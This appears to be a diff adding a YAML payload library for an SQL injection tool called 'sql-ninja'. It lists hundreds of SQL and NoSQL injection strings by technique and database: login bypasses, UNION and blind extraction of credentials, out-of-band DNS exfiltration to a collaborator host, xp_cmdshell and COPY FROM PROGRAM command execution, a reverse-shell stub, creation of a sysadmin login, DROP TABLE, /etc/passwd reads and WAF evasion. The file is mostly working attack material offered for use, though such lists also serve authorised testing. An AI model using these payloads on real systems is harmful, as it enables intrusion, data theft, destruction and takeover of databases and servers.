@@ -1,0 +1,1408 @@
+# sql-ninja Payload Library
+# Trained on 60+ HackerOne SQLi reports + PortSwigger + PayloadsAllTheThings + OWASP WAF Bypass + SQLmap Tamper Scripts
+# 500+ payloads organized by technique, DBMS, and WAF bypass method
+
+###############################################################################
+# 1. DETECTION & AUTH BYPASS
+###############################################################################
+detection:
+  - payload: "'"
+    description: "Single quote break — detects SQL syntax error"
+    technique: "basic_break"
+  - payload: "\""
+    description: "Double quote break"
+    technique: "basic_break"
+  - payload: "')"
+    description: "Single quote + paren break"
+    technique: "basic_break"
+  - payload: "'))"
+    description: "Double paren break"
+    technique: "basic_break"
+  - payload: "\\"
+    description: "Backslash escape break"
+    technique: "basic_break"
+  - payload: "`"
+    description: "Backtick break (MySQL)"
+    technique: "basic_break"
+  - payload: '%%2727'
+    description: "Double URL-encoded quote"
+    technique: "encoding_bypass"
+
+auth_bypass:
+  - payload: "' OR '1'='1' -- -"
+    description: "Classic auth bypass — single quote"
+    technique: "tautology"
+    tag: "classic"
+  - payload: "\" OR \"1\"=\"1\" -- -"
+    description: "Classic auth bypass — double quote"
+    technique: "tautology"
+  - payload: "' OR 1=1 -- -"
+    description: "Auth bypass without quotes in comparison"
+    technique: "tautology"
+  - payload: "admin' -- -"
+    description: "Username truncation bypass"
+    technique: "comment_truncation"
+    tag: "classic"
+  - payload: "admin' /*"
+    description: "Username truncation with open comment"
+    technique: "comment_truncation"
+  - payload: "' OR 1=1 LIMIT 1 -- -"
+    description: "Auth bypass limited to 1 row — prevents multiple row errors"
+    technique: "tautology_limited"
+    tag: "classic"
+  - payload: "' OR '1'='1' LIMIT 1 -- -"
+    description: "Limited auth bypass with quotes"
+    technique: "tautology_limited"
+  - payload: "' UNION SELECT 1,'hash' -- -"
+    description: "Union-based auth bypass with known password hash"
+    technique: "union_hash_bypass"
+  - payload: "admin' AND 1=0 UNION SELECT 'admin','$2y$10$hash' -- -"
+    description: "Bcrypt hash injection bypass"
+    technique: "union_hash_bypass"
+  - payload: "' OR 1=1#"
+    description: "MySQL auth bypass with hash comment"
+    technique: "tautology"
+    dbms: "MySQL"
+  - payload: "' OR 1=1;%00"
+    description: "Null byte terminated bypass"
+    technique: "null_byte"
+  - payload: "' OR '1'='1' AND 1=1 -- -"
+    description: "Multi-condition auth bypass"
+    technique: "tautology"
+
+###############################################################################
+# 2. COLUMN DISCOVERY
+###############################################################################
+column_discovery:
+  - payload: "' ORDER BY 1 -- -"
+    description: "Order by column 1 — success if at least 1 column"
+    technique: "order_by"
+  - payload: "' ORDER BY 2 -- -"
+    technique: "order_by"
+  - payload: "' ORDER BY 3 -- -"
+    technique: "order_by"
+  - payload: "' ORDER BY 4 -- -"
+    technique: "order_by"
+  - payload: "' ORDER BY 5 -- -"
+    technique: "order_by"
+  - payload: "' ORDER BY 10 -- -"
+    description: "Quick jump to 10 columns"
+    technique: "order_by"
+  - payload: "' ORDER BY 50 -- -"
+    description: "Quick jump to 50 columns (rare)"
+    technique: "order_by"
+  - payload: "1' GROUP BY 1-- -"
+    description: "GROUP BY column discovery (alternative to ORDER BY)"
+    technique: "group_by"
+
+###############################################################################
+# 3. UNION-BASED INJECTION
+###############################################################################
+union_based:
+  - payload: "' UNION SELECT NULL -- -"
+    description: "1-column UNION"
+    technique: "union"
+  - payload: "' UNION SELECT NULL,NULL -- -"
+    description: "2-column UNION"
+    technique: "union"
+  - payload: "' UNION SELECT NULL,NULL,NULL -- -"
+    description: "3-column UNION (most common)"
+    technique: "union"
+    tag: "common"
+  - payload: "' UNION SELECT NULL,NULL,NULL,NULL -- -"
+    description: "4-column UNION"
+    technique: "union"
+  - payload: "' UNION SELECT 1,2,3 -- -"
+    description: "3-column UNION with integers to find output position"
+    technique: "union_position"
+    tag: "classic"
+  - payload: "' UNION SELECT 1,@@version,3 -- -"
+    description: "Version extraction via UNION"
+    technique: "union_extract"
+    tag: "common"
+  - payload: "' UNION SELECT 1,database(),3 -- -"
+    description: "Database name extraction"
+    technique: "union_extract"
+  - payload: "' UNION SELECT 1,user(),3 -- -"
+    description: "Database user extraction"
+    technique: "union_extract"
+  - payload: "' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database() -- -"
+    description: "Extract all table names"
+    technique: "union_extract"
+    tag: "data_extraction"
+  - payload: "' UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name=0x7573657273 -- -"
+    description: "Extract columns from users table (hex name)"
+    technique: "union_extract"
+    tag: "data_extraction"
+  - payload: "' UNION SELECT 1,GROUP_CONCAT(username,0x3a,password),3 FROM users -- -"
+    description: "Extract credentials"
+    technique: "union_extract"
+    tag: "data_extraction"
+  - payload: "' UNION SELECT 1,GROUP_CONCAT(0x7e,table_name,0x7e),3 FROM information_schema.tables -- -"
+    description: "Extract table names with tilde delimiters"
+    technique: "union_extract"
+    tag: "data_extraction"
+
+###############################################################################
+# 4. BOOLEAN-BASED BLIND
+###############################################################################
+boolean_blind:
+  true_conditions:
+    - payload: "' AND 1=1 -- -"
+      description: "True condition — should return original page"
+      technique: "boolean_true"
+      tag: "classic"
+    - payload: "' AND '1'='1' -- -"
+      description: "String-based true condition"
+      technique: "boolean_true"
+    - payload: "1' AND 1=1 -- -"
+      description: "Numeric context true"
+      technique: "boolean_true"
+    - payload: "1' OR '1'='1' -- -"
+      description: "OR-based true (returns more rows)"
+      technique: "boolean_true"
+    - payload: "' AND 1 -- -"
+      description: "Implicit true (MySQL)"
+      technique: "boolean_true"
+    - payload: "' AND 'a'='a' -- -"
+      description: "String comparison true"
+      technique: "boolean_true"
+    - payload: "1' AND 1 < 2 -- -"
+      description: "Inequality true"
+      technique: "boolean_true"
+
+  false_conditions:
+    - payload: "' AND 1=2 -- -"
+      description: "False condition — should differ from original"
+      technique: "boolean_false"
+      tag: "classic"
+    - payload: "' AND '1'='2' -- -"
+      description: "String-based false condition"
+      technique: "boolean_false"
+    - payload: "1' AND 1=2 -- -"
+      description: "Numeric context false"
+      technique: "boolean_false"
+    - payload: "' AND 1=0 -- -"
+      description: "False with 0"
+      technique: "boolean_false"
+    - payload: "' AND 'a'='b' -- -"
+      description: "String comparison false"
+      technique: "boolean_false"
+    - payload: "1' AND 1 > 2 -- -"
+      description: "Inequality false"
+      technique: "boolean_false"
+
+  extraction:
+    - payload: "' AND ASCII(SUBSTRING((SELECT database()),{POS},1))>{CHAR} -- -"
+      description: "Binary search char extraction — database name"
+      technique: "binary_search"
+      template: true
+    - payload: "' AND ASCII(SUBSTRING((SELECT @@version),{POS},1))={CHAR} -- -"
+      description: "Exact char match — version"
+      technique: "char_by_char"
+      template: true
+    - payload: "' AND ORD(MID((SELECT table_name FROM information_schema.tables LIMIT 1),{POS},1))>{CHAR} -- -"
+      description: "Table name binary search"
+      technique: "binary_search"
+      template: true
+    - payload: "' AND (SELECT COUNT(*) FROM users)>0 -- -"
+      description: "Check if users table exists"
+      technique: "table_exists"
+    - payload: "' AND (SELECT LENGTH(password) FROM users LIMIT 1)>{LEN} -- -"
+      description: "Find password hash length"
+      technique: "length_discovery"
+      template: true
+
+###############################################################################
+# 5. ERROR-BASED INJECTION
+###############################################################################
+error_based:
+  mysql:
+    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT @@version))) -- -"
+      description: "MySQL XPATH error — version leak"
+      technique: "xpath_error"
+      tag: "classic"
+    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT database()))) -- -"
+      description: "MySQL XPATH error — database name"
+      technique: "xpath_error"
+    - payload: "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()))) -- -"
+      description: "MySQL XPATH error — all tables"
+      technique: "xpath_error"
+      tag: "data_extraction"
+    - payload: "' AND UPDATEXML(1, CONCAT(0x7e, (SELECT @@version)), 1) -- -"
+      description: "MySQL UPDATEXML error — version"
+      technique: "updatexml_error"
+    - payload: "' AND 1=(SELECT COUNT(*) FROM INFORMATION_SCHEMA.TABLES GROUP BY CONCAT(0x7e,@@version,FLOOR(RAND()*2))) -- -"
+      description: "MySQL double-query error — version"
+      technique: "duplicate_entry_error"
+    - payload: "' AND 1=2 UNION SELECT 1,2,3,4,5 -- -"
+      description: "Union error with type mismatch"
+      technique: "type_mismatch_error"
+
+  postgresql:
+    - payload: "' AND 1=CAST((SELECT version()) AS INT) -- -"
+      description: "PostgreSQL CAST error — version leak"
+      technique: "cast_error"
+      tag: "classic"
+    - payload: "' AND 1=CAST((SELECT current_database()) AS INT) -- -"
+      description: "PostgreSQL CAST error — database name"
+      technique: "cast_error"
+    - payload: "' AND 1=(SELECT COUNT(*) FROM GENERATE_SERIES(1,1000000)) -- -"
+      description: "PostgreSQL heavy query error"
+      technique: "heavy_query"
+    - payload: "' AND 1=(SELECT 1/0) -- -"
+      description: "PostgreSQL divide by zero error"
+      technique: "divide_by_zero"
+
+  mssql:
+    - payload: "' AND 1=CONVERT(INT, @@version) -- -"
+      description: "MSSQL CONVERT error — version leak"
+      technique: "convert_error"
+      tag: "classic"
+    - payload: "' AND 1=CONVERT(INT, (SELECT DB_NAME())) -- -"
+      description: "MSSQL CONVERT error — database name"
+      technique: "convert_error"
+    - payload: "' AND 1=CAST(@@version AS INT) -- -"
+      description: "MSSQL CAST error — version"
+      technique: "cast_error"
+
+  oracle:
+    - payload: "' AND 1=CTXSYS.DRITHSX.SN(1, (SELECT banner FROM v$version)) -- -"
+      description: "Oracle CTXSYS error — version"
+      technique: "ctxsys_error"
+      tag: "classic"
+    - payload: "' AND 1=XMLTYPE('<xml>') -- -"
+      description: "Oracle XML parse error"
+      technique: "xml_error"
+    - payload: "' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version)) -- -"
+      description: "Oracle DNS resolution error"
+      technique: "dns_error"
+
+  sqlite:
+    - payload: "' AND json('{}') -- -"
+      description: "SQLite JSON parse error"
+      technique: "json_error"
+    - payload: "' AND CASE WHEN 1=1 THEN 1 ELSE json('') END -- -"
+      description: "SQLite conditional JSON error"
+      technique: "conditional_json_error"
+
+###############################################################################
+# 6. TIME-BASED BLIND
+###############################################################################
+time_based:
+  mysql:
+    - payload: "' AND SLEEP(5) -- -"
+      description: "MySQL SLEEP 5 seconds"
+      technique: "sleep"
+      tag: "classic"
+    - payload: "' AND SLEEP(10) -- -"
+      description: "MySQL SLEEP 10 seconds"
+      technique: "sleep"
+    - payload: "' AND BENCHMARK(5000000, MD5('x')) -- -"
+      description: "MySQL BENCHMARK heavy computation"
+      technique: "benchmark"
+    - payload: "' AND BENCHMARK(10000000, SHA1('x')) -- -"
+      description: "MySQL heavier BENCHMARK"
+      technique: "benchmark"
+    - payload: "' AND IF(ASCII(SUBSTRING((SELECT @@version),1,1))>50, SLEEP(5), 0) -- -"
+      description: "MySQL conditional time — version binary search"
+      technique: "conditional_sleep"
+      tag: "data_extraction"
+    - payload: "' AND IF(ORD(MID((SELECT database()),1,1))>100, SLEEP(5), 0) -- -"
+      description: "MySQL conditional time — database name"
+      technique: "conditional_sleep"
+    - payload: "1' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>10 AND SLEEP(5) -- -"
+      description: "MySQL conditional — check table count"
+      technique: "conditional_sleep"
+
+  postgresql:
+    - payload: "' AND pg_sleep(5) -- -"
+      description: "PostgreSQL pg_sleep 5 seconds"
+      technique: "sleep"
+      tag: "classic"
+    - payload: "' AND pg_sleep(10) -- -"
+      description: "PostgreSQL pg_sleep 10 seconds"
+      technique: "sleep"
+    - payload: "' AND CASE WHEN (ASCII(SUBSTRING(version(),1,1))>50) THEN pg_sleep(5) ELSE pg_sleep(0) END -- -"
+      description: "PostgreSQL conditional time"
+      technique: "conditional_sleep"
+      tag: "data_extraction"
+    - payload: "' AND (SELECT COUNT(*) FROM pg_sleep(5))>0 -- -"
+      description: "PostgreSQL subquery sleep"
+      technique: "sleep_subquery"
+
+  mssql:
+    - payload: "'; WAITFOR DELAY '0:0:5' -- -"
+      description: "MSSQL WAITFOR 5 seconds"
+      technique: "waitfor"
+      tag: "classic"
+    - payload: "'; WAITFOR DELAY '0:0:10' -- -"
+      description: "MSSQL WAITFOR 10 seconds"
+      technique: "waitfor"
+    - payload: "' IF (ASCII(SUBSTRING(@@version,1,1))>50) WAITFOR DELAY '0:0:5' -- -"
+      description: "MSSQL conditional WAITFOR"
+      technique: "conditional_waitfor"
+      tag: "data_extraction"
+    - payload: "'; IF (SELECT COUNT(*) FROM sysobjects)>0 WAITFOR DELAY '0:0:5' -- -"
+      description: "MSSQL conditional — table exists"
+      technique: "conditional_waitfor"
+
+  oracle:
+    - payload: "' AND DBMS_PIPE.RECEIVE_MESSAGE('x', 5) -- -"
+      description: "Oracle DBMS_PIPE 5 seconds"
+      technique: "pipe_receive"
+      tag: "classic"
+    - payload: "' AND (CASE WHEN (ASCII(SUBSTR(BANNER,1,1))>50) THEN DBMS_PIPE.RECEIVE_MESSAGE('x',5) ELSE NULL END) -- -"
+      description: "Oracle conditional time"
+      technique: "conditional_pipe"
+      tag: "data_extraction"
+    - payload: "' AND (SELECT COUNT(*) FROM all_tables)>0 AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1 -- -"
+      description: "Oracle conditional — table exists"
+      technique: "conditional_pipe"
+
+  sqlite:
+    - payload: "' AND LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) -- -"
+      description: "SQLite heavy LIKE — causes delay"
+      technique: "heavy_query"
+    - payload: "' AND CASE WHEN 1=1 THEN LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2)))) ELSE 0 END -- -"
+      description: "SQLite conditional heavy delay"
+      technique: "conditional_heavy"
+
+###############################################################################
+# 7. OUT-OF-BAND (OAST) INJECTION
+###############################################################################
+oast:
+  mysql:
+    - payload: "SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT @@version),'.{COLLABORATOR}.oastify.com\\\\\\\\a'))"
+      description: "MySQL OOB — version via DNS to Collaborator"
+      technique: "dns_exfil"
+      requires: "collaborator_domain"
+    - payload: "SELECT * FROM users INTO OUTFILE CONCAT('\\\\\\\\',(SELECT @@version),'.{COLLABORATOR}.oastify.com\\\\\\\\a')"
+      description: "MySQL OOB — INTO OUTFILE DNS"
+      technique: "dns_exfil"
+      requires: "collaborator_domain"
+    - payload: "' AND LOAD_FILE('\\\\\\\\{COLLABORATOR}.oastify.com\\\\\\\\a') -- -"
+      description: "MySQL OOB — LOAD_FILE DNS lookup"
+      technique: "dns_lookup"
+      requires: "collaborator_domain"
+
+  mssql:
+    - payload: "EXEC master..xp_dirtree '//{COLLABORATOR}.oastify.com/a'"
+      description: "MSSQL OOB — xp_dirtree DNS"
+      technique: "dns_exfil"
+      requires: "collaborator_domain"
+      tag: "classic"
+    - payload: "DECLARE @q varchar(1024); SET @q='\\\\'+(SELECT @@version)+'.{COLLABORATOR}.oastify.com\\a'; EXEC master..xp_dirtree @q"
+      description: "MSSQL OOB — version via xp_dirtree"
+      technique: "dns_exfil"
+      requires: "collaborator_domain"
+    - payload: "EXEC master..xp_cmdshell 'nslookup {COLLABORATOR}.oastify.com'"
+      description: "MSSQL OOB — xp_cmdshell DNS"
+      technique: "dns_exfil"
+      requires: "collaborator_domain,xp_cmdshell"
+
+  postgresql:
+    - payload: "COPY (SELECT '') TO PROGRAM 'nslookup {COLLABORATOR}.oastify.com'"
+      description: "PostgreSQL OOB — COPY PROGRAM DNS"
+      technique: "dns_exfil"
+      requires: "collaborator_domain,superuser"
+      tag: "classic"
+    - payload: "CREATE OR REPLACE FUNCTION f() RETURNS void AS $$ DECLARE c text; DECLARE p text; BEGIN SELECT INTO p (SELECT version()); c := 'copy (SELECT '''') to program ''nslookup '||p||'.{COLLABORATOR}.oastify.com'''; EXECUTE c; END; $$ LANGUAGE plpgsql SECURITY DEFINER; SELECT f()"
+      description: "PostgreSQL OOB — version via function DNS"
+      technique: "dns_exfil"
+      requires: "collaborator_domain,superuser"
+
+  oracle:
+    - payload: "SELECT UTL_INADDR.get_host_address('{COLLABORATOR}.oastify.com') FROM dual"
+      description: "Oracle OOB — UTL_INADDR DNS"
+      technique: "dns_lookup"
+      requires: "collaborator_domain"
+    - payload: "SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE root [<!ENTITY % remote SYSTEM \"http://'||(SELECT banner FROM v$version)||'.{COLLABORATOR}.oastify.com/\"> %remote;]>'),'/l') FROM dual"
+      description: "Oracle OOB — XXE DNS exfil with version"
+      technique: "xxe_dns_exfil"
+      requires: "collaborator_domain"
+
+###############################################################################
+# 8. STACKED QUERIES
+###############################################################################
+stacked_queries:
+  mssql:
+    - payload: "'; EXEC xp_cmdshell 'whoami' -- -"
+      description: "MSSQL RCE — xp_cmdshell whoami"
+      technique: "rce"
+      severity: "critical"
+      tag: "classic"
+    - payload: "'; EXEC xp_cmdshell 'powershell -enc BASE64' -- -"
+      description: "MSSQL RCE — PowerShell reverse shell"
+      technique: "rce"
+      severity: "critical"
+    - payload: "'; EXEC sp_addlogin 'hacker','P@ssw0rd' -- -"
+      description: "MSSQL — create new login"
+      technique: "persistence"
+      severity: "critical"
+    - payload: "'; EXEC sp_addsrvrolemember 'hacker','sysadmin' -- -"
+      description: "MSSQL — escalate to sysadmin"
+      technique: "privilege_escalation"
+      severity: "critical"
+    - payload: "'; EXEC master..xp_dirtree '//{COLLABORATOR}.oastify.com/a' -- -"
+      description: "MSSQL stacked — OOB via xp_dirtree"
+      technique: "oob_stacked"
+      requires: "collaborator_domain"
+
+  postgresql:
+    - payload: "'; CREATE TABLE pwned(data text); COPY pwned FROM PROGRAM 'whoami'; SELECT * FROM pwned -- -"
+      description: "PostgreSQL RCE — COPY FROM PROGRAM"
+      technique: "rce"
+      severity: "critical"
+      tag: "classic"
+    - payload: "'; DROP TABLE users -- -"
+      description: "PostgreSQL destructive — DROP TABLE"
+      technique: "destructive"
+      severity: "critical"
+
+  mysql:
+    - payload: "'; SELECT 1 INTO OUTFILE '/tmp/pwned.txt' -- -"
+      description: "MySQL — write file"
+      technique: "file_write"
+      severity: "medium"
+    - payload: "'; SELECT LOAD_FILE('/etc/passwd') -- -"
+      description: "MySQL — read file"
+      technique: "file_read"
+      severity: "medium"
+
+###############################################################################
+# 9. NOSQL INJECTION (MongoDB)
+###############################################################################
+nosql:
+  mongodb_auth_bypass:
+    - payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}'
+      description: "MongoDB auth bypass — $gt empty string (returns all)"
+      technique: "gt_bypass"
+      tag: "classic"
+    - payload: '{"username": {"$ne": null}, "password": {"$ne": null}}'
+      description: "MongoDB auth bypass — $ne null (returns all)"
+      technique: "ne_bypass"
+      tag: "classic"
+    - payload: '{"$or": [{"username": "admin"}, {"username": {"$gt": ""}}], "password": {"$gt": ""}}'
+      description: "MongoDB auth bypass — $or condition"
+      technique: "or_bypass"
+    - payload: '{"username": "admin", "password": {"$regex": ".*"}}'
+      description: "MongoDB auth bypass — regex match all"
+      technique: "regex_bypass"
+
+  mongodb_where:
+    - payload: "' || 1==1 //"
+      description: "MongoDB $where — always true (URL param)"
+      technique: "where_injection"
+      tag: "classic"
+    - payload: "' || 1==1 || '"
+      description: "MongoDB $where — always true (alternate)"
+      technique: "where_injection"
+    - payload: "'; return true; //"
+      description: "MongoDB $where — JavaScript return true"
+      technique: "where_injection"
+    - payload: "' && this.password.match(/.*/) //"
+      description: "MongoDB $where — verify password field exists"
+      technique: "where_conditional"
+    - payload: "username[$where]=1==1"
+      description: "MongoDB $where via query string"
+      technique: "where_injection"
+
+  mongodb_blind:
+    - payload: '{"$where": "this.password.length==32"}'
+      description: "MongoDB blind — check password hash length"
+      technique: "blind_length"
+      tag: "data_extraction"
+    - payload: '{"$where": "this.password[0]==\'a\'"}'
+      description: "MongoDB blind — check first password char"
+      technique: "blind_char"
+      tag: "data_extraction"
+    - payload: '{"$where": "sleep(5000)"}'
+      description: "MongoDB time-based — $where sleep"
+      technique: "time_based"
+
+  mongodb_regex:
+    - payload: '{"username": {"$regex": "^admin"}}'
+      description: "MongoDB regex — find admin users"
+      technique: "regex_extraction"
+    - payload: '{"username": {"$regex": "^a"}}'
+      description: "MongoDB regex — users starting with 'a'"
+      technique: "regex_extraction"
+      tag: "data_extraction"
+    - payload: '{"username": {"$regex": "^.[a-z]"}}'
+      description: "MongoDB regex — second char a-z"
+      technique: "regex_extraction"
+
+  mongodb_json_body:
+    - payload: '{"id": {"$gt": ""}}'
+      description: "MongoDB JSON body — $gt bypass"
+      technique: "json_gt"
+    - payload: '{"id": {"$ne": null}}'
+      description: "MongoDB JSON body — $ne bypass"
+      technique: "json_ne"
+    - payload: '{"query": {"$regex": ".*"}}'
+      description: "MongoDB JSON body — regex search"
+      technique: "json_regex"
+    - payload: '{"$or": [{"name": "x"}, {"role": {"$gt": ""}}]}'
+      description: "MongoDB $or — role escalation"
+      technique: "json_or"
+
+  elasticsearch:
+    - payload: "' && 1=1 -- -"
+      description: "Elasticsearch SQL — always true"
+      technique: "sql_es_bypass"
+    - payload: "' || 1==1 -- -"
+      description: "Elasticsearch — JS-style condition"
+      technique: "js_es_bypass"
+
+###############################################################################
+# 10. WAF BYPASS TECHNIQUES
+###############################################################################
+waf_bypass:
+  comment_injection:
+    - payload: "' UN/**/ION SEL/**/ECT 1,2,3 -- -"
+      description: "Comment inside keywords"
+      technique: "comment"
+      tag: "classic"
+    - payload: "' UNION/**/SELECT/**/1,2,3 -- -"
+      description: "Comment between keywords"
+      technique: "comment"
+    - payload: "' /*!UNION*/ /*!SELECT*/ 1,2,3 -- -"
+      description: "MySQL conditional comment"
+      technique: "conditional_comment"
+      dbms: "MySQL"
+    - payload: "' /*!50000UNION*/ /*!50000SELECT*/ 1,2,3 -- -"
+      description: "MySQL version-specific comment (5.0.00+)"
+      technique: "version_comment"
+      dbms: "MySQL"
+
+  case_mutation:
+    - payload: "' UnIoN SeLeCt 1,2,3 -- -"
+      description: "Mixed case bypass"
+      technique: "case_mutation"
+      tag: "classic"
+    - payload: "' UNION SELECT 1,2,3 -- -"
+      description: "All uppercase (bypasses lowercase filters)"
+      technique: "case_mutation"
+    - payload: "' union select 1,2,3 -- -"
+      description: "All lowercase"
+      technique: "case_mutation"
+    - payload: "' uNiOn sElEcT 1,2,3 -- -"
+      description: "Alternating case"
+      technique: "case_mutation"
+
+  keyword_replacement:
+    - payload: "' UNUNIONION SELSELECTECT 1,2,3 -- -"
+      description: "Double keyword (removal filter bypass)"
+      technique: "keyword_replacement"
+      tag: "classic"
+    - payload: "' UNION DISTINCT SELECT 1,2,3 -- -"
+      description: "DISTINCT between keywords"
+      technique: "keyword_insertion"
+    - payload: "' UNION DISTINCTROW SELECT 1,2,3 -- -"
+      description: "DISTINCTROW between keywords"
+      technique: "keyword_insertion"
+
+  encoding:
+    - payload: "' %55nion %53elect 1,2,3 -- -"
+      description: "URL-encoded first letter"
+      technique: "url_encoding"
+      tag: "classic"
+    - payload: "' %55NION %53ELECT 1,2,3 -- -"
+      description: "URL-encoded uppercase"
+      technique: "url_encoding"
+    - payload: "' u%6eion s%65lect 1,2,3 -- -"
+      description: "URL-encoded partial keyword"
+      technique: "url_encoding"
+    - payload: "' %75%6e%69%6f%6e %73%65%6c%65%63%74 1,2,3 -- -"
+      description: "Fully URL-encoded keywords"
+      technique: "url_encoding"
+    - payload: "' %2555nion %2553elect 1,2,3 -- -"
+      description: "Double URL-encoding"
+      technique: "double_encoding"
+    - payload: "' %%273327 -- -"
+      description: "Double-encoded single quote"
+      technique: "double_encoding"
+
+  whitespace_substitution:
+    - payload: "'%09OR%091=1-- -"
+      description: "Tab (%09) instead of space"
+      technique: "whitespace_sub"
+    - payload: "'%0AOR%0A1=1-- -"
+      description: "Newline (%0A) instead of space"
+      technique: "whitespace_sub"
+    - payload: "'%0BOR%0B1=1-- -"
+      description: "Vertical tab (%0B)"
+      technique: "whitespace_sub"
+    - payload: "'%0COR%0C1=1-- -"
+      description: "Form feed (%0C)"
+      technique: "whitespace_sub"
+    - payload: "'%0DOR%0D1=1-- -"
+      description: "Carriage return (%0D)"
+      technique: "whitespace_sub"
+    - payload: "'%A0OR%A01=1-- -"
+      description: "Non-breaking space (%A0, MySQL)"
+      technique: "whitespace_sub"
+    - payload: "'/**/OR/**/1=1-- -"
+      description: "Comment as space separator"
+      technique: "comment_as_space"
+    - payload: "'(+)OR(+)1=1-- -"
+      description: "Parentheses without spaces"
+      technique: "no_space_parens"
+
+  hpp_http_parameter_pollution:
+    - payload: "?id=1/*&id=*/union/*&id=*/select/*&id=*/1,2,3/*&id=*/--+-"
+      description: "HPP — split UNION SELECT across params"
+      technique: "hpp"
+      tag: "classic"
+    - payload: "?id=1&id=UNION&id=SELECT&id=1,2,3&id=--"
+      description: "HPP — array-style parameter injection"
+      technique: "hpp"
+
+  hpf_http_parameter_fragmentation:
+    - payload: "?a=1+union/*&b=*/select+1,2/*&c=*/from+users--+-"
+      description: "HPF — fragment UNION across 2+ params"
+      technique: "hpf"
+      tag: "classic"
+
+  operator_bypass:
+    - payload: "' OR 1 LIKE 1 -- -"
+      description: "LIKE instead of ="
+      technique: "operator_sub"
+    - payload: "' OR 1 BETWEEN 0 AND 2 -- -"
+      description: "BETWEEN instead of ="
+      technique: "operator_sub"
+    - payload: "' OR 1 IN (1) -- -"
+      description: "IN instead of ="
+      technique: "operator_sub"
+    - payload: "' OR 'a' BETWEEN '`' AND 'b' -- -"
+      description: "String BETWEEN instead of ="
+      technique: "operator_sub"
+    - payload: "' OR 1 IS NOT NULL -- -"
+      description: "IS NOT NULL instead of true"
+      technique: "operator_sub"
+    - payload: "' OR NOT 1=2 -- -"
+      description: "Negation to express true"
+      technique: "operator_sub"
+    - payload: "' AND 1 -- -"
+      description: "Implied true (MySQL)"
+      technique: "operator_sub"
+    - payload: "' OR '1' IN ('1') -- -"
+      description: "IN string comparison"
+      technique: "operator_sub"
+
+  hex_obfuscation:
+    - payload: "' UNION SELECT 1,0x3a,3 FROM users -- -"
+      description: "Hex string in SELECT"
+      technique: "hex_encoding"
+    - payload: "' AND 1=0x1 -- -"
+      description: "Hex number comparison"
+      technique: "hex_encoding"
+    - payload: "' UNION SELECT 1,unhex('7573657273'),3 -- -"
+      description: "unhex() to encode 'users' table name"
+      technique: "hex_function"
+    - payload: "' AND password=0x68617368 -- -"
+      description: "Hex password comparison"
+      technique: "hex_encoding"
+
+  buffer_overflow:
+    - payload: "1' AND (SELECT 1)=(SELECT 0xAAAAAAAA...[~1000 A's]) AND '1'='1"
+      description: "Buffer overflow to crash WAF parser"
+      technique: "buffer_overflow"
+      tag: "advanced"
+
+  null_byte:
+    - payload: "'%00' OR 1=1 -- -"
+      description: "Null byte before OR"
+      technique: "null_byte"
+    - payload: "' OR%001=1 -- -"
+      description: "Null byte between tokens"
+      technique: "null_byte"
+
+  unicode_normalization:
+    - payload: "%CA%BA OR 1=1 -- -"
+      description: "Unicode modifier letter double prime -> double quote"
+      technique: "unicode_bypass"
+    - payload: "%CA%B9 OR 1=1 -- -"
+      description: "Unicode modifier letter prime -> single quote"
+      technique: "unicode_bypass"
+
+  no_comma_bypass:
+    - payload: "' UNION SELECT * FROM (SELECT 1)a JOIN (SELECT 2)b JOIN (SELECT 3)c -- -"
+      description: "No commas — JOIN instead of comma-separated"
+      technique: "no_comma"
+    - payload: "' LIMIT 1 OFFSET 0 -- -"
+      description: "No comma — OFFSET instead of LIMIT X,Y"
+      technique: "no_comma"
+    - payload: "' UNION SELECT 1 FROM (SELECT 1)a UNION SELECT 2 FROM (SELECT 1)b -- -"
+      description: "No commas — multiple UNIONs"
+      technique: "no_comma"
+
+  scientific_notation:
+    - payload: "1e1 AND 1=1 -- -"
+      description: "Scientific notation for number 10"
+      technique: "scientific_notation"
+    - payload: "' UNION SELECT 1e1,2,3 -- -"
+      description: "sci notation in UNION"
+      technique: "scientific_notation"
+
+  oracle_no_from:
+    - payload: "' UNION SELECT 1 FROM dual -- -"
+      description: "Oracle requires FROM dual"
+      technique: "oracle_dual"
+      dbms: "Oracle"
+
+###############################################################################
+# 11. SECOND-ORDER SQL INJECTION
+###############################################################################
+second_order:
+  storage_payloads:
+    - payload: "admin' OR '1'='1' -- -"
+      description: "Store in username for later auth bypass"
+      technique: "auth_bypass_stored"
+    - payload: "'; DROP TABLE users -- -"
+      description: "Store destructive payload"
+      technique: "destructive_stored"
+    - payload: "' UNION SELECT 1,@@version,3,4 -- -"
+      description: "Store UNION payload for retrieval extraction"
+      technique: "union_stored"
+
+###############################################################################
+# 12. PDO PREPARED STATEMENT BYPASS (CVE-2025)
+###############################################################################
+pdo_bypass:
+  - payload_first_param: "?#%00"
+    payload_second_param: "anything"
+    description: "PDO detection — send ?# followed by null byte"
+    technique: "pdo_detect"
+    phase: "detection"
+  - payload_first_param: "?#%00"
+    payload_second_param: "x`;%23"
+    description: "PDO confirm — backtick + semicolon + comment"
+    technique: "pdo_confirm"
+    phase: "confirmation"
+  - payload_first_param: "?#%00"
+    payload_second_param: "x` FROM (SELECT table_name AS `'x` FROM information_schema.tables)y;%23"
+    description: "PDO extract — table names via error"
+    technique: "pdo_extract"
+    phase: "extraction"
+    tag: "data_extraction"
+
+###############################################################################
+# 13. MASS ASSIGNMENT / JSON SWAPPING
+###############################################################################
+mass_assignment:
+  - payload: '{"role": "admin", "is_admin": true}'
+    description: "JSON mass assignment — escalate role"
+    technique: "json_mass_assignment"
+  - payload: '{"$set": {"role": "admin"}}'
+    description: "MongoDB $set operator — escalate role"
+    technique: "mongodb_set"
+
+###############################################################################
